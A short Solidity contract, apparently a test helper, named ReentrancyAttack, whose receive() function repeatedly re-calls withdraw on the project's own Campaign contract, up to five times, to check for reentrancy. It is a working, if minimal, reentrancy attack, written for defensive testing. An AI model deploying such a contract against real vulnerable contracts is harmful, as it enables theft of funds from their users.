// SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import {Campaign} from '../../src/Campaign.sol';

contract ReentrancyAttack{
    Campaign public campaign;
    
    uint256  public attackCount;
    bool attacking;


    function setCampaign(address _campaign) public{
        campaign = Campaign(_campaign);
    }

    function attack() external payable{
        attacking = true;
        attackCount =0;

        campaign.withdraw(0);
    }

    receive() external payable{
        
        if(attacking  && attackCount < 5){
            attackCount++;
            campaign.withdraw(0);
        }
    }
}